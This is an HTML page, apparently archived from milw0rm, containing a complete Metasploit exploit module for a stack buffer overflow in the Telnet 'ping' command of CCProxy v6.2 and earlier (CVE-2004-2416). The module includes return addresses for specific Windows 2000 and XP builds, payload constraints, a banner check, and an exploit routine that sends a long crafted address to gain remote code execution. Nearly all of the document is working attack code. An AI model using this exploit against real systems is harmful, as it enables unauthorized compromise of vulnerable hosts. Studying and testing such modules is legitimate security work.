<html><head><title>CCProxy <= v6.2 Telnet Proxy Ping Overflow Exploit (meta)</title></head><pre>##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/ 
##

require 'msf/core'

module Msf

class Exploits::Windows::Proxy::CCProxy_Telnet_Ping &lt; Msf::Exploit::Remote
	
	include Exploit::Remote::Tcp

	def initialize(info = {}) 
		super(update_info(info,    
			'Name'		=&gt; 'CCProxy &lt;= v6.2 Telnet Proxy Ping Overflow',
			'Description'	=&gt; %q{
            			This module exploits the YoungZSoft CCProxy &lt;= v6.2 suite Telnet service.
				The stack is overwritten when sending an overly long address to the 'ping' command.
			},
			'Author' 	=&gt; [ 'Patrick Webster &lt;patrick[at]aushack.com&gt;' ],
			'Arch'		=&gt; [ ARCH_X86 ], 
			'License'       =&gt; MSF_LICENSE,
			'Version'       =&gt; '$Revision$',
			'References'    =&gt;
			[
				[ 'BID', '11666 ' ],
				[ 'CVE', '2004-2416' ],
				[ 'MIL', '621' ],
				[ 'OSVDB', '11593' ],
			],         
			'Privileged'		=&gt; false,
			'DefaultOptions'	=&gt;
			{
				'EXITFUNC' 	=&gt; 'thread',
			},
			'Payload' =&gt;
				{ 
					'Space'		=&gt; 1012,
					'BadChars' 	=&gt; &quot;\x00\x07\x08\x0a\x0d&quot;,
				},
			'Platform' =&gt; ['win'],
			'Targets' =&gt;
			[
			# Patrick - Tested OK 2007/08/19. W2K SP0, W2KSP4, XP SP0, XP SP2 EN.
				[
				'Windows 2000 Pro All - English',
				{
					'Ret'	=&gt; 0x75023411, # call esi ws2help.dll
				}
				],
				[
				'Windows 2000 Pro All - Italian',
				{
					'Ret'	=&gt; 0x74fd2b81, # call esi ws2help.dll
				}
				],
				[
				'Windows 2000 Pro All - French',
				{
					'Ret'	=&gt; 0x74fa2b22, # call esi ws2help.dll
				}
				],
                 		[
				'Windows XP SP0/1 - English',
				{
					'Ret'	=&gt; 0x71aa1a97, # call esi ws2help.dll
				}
				],
                 		[
				'Windows XP SP2 - English',
				{
					'Ret'	=&gt; 0x71aa1b22, # call esi ws2help.dll
				}
				],
			],
			'DisclosureDate' =&gt; 'Nov 11 2004'))
            
			register_options(
			[
				Opt::RPORT(23),
			], self.class)
	end

	def autofilter
		false
	end

	def check 
		connect
		banner = sock.get_once(-1,3)

		if (banner =~ /CCProxy Telnet Service Ready/)
			return Exploit::CheckCode::Appears 
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect
		
		sploit  = &quot;p &quot; + payload.encoded + [target['Ret']].pack('V') + make_nops(7)
		sock.put(sploit + &quot;\r\n&quot;)

		handler
		disconnect
	end

end
end

# milw0rm.com [2007-09-03]</pre></html>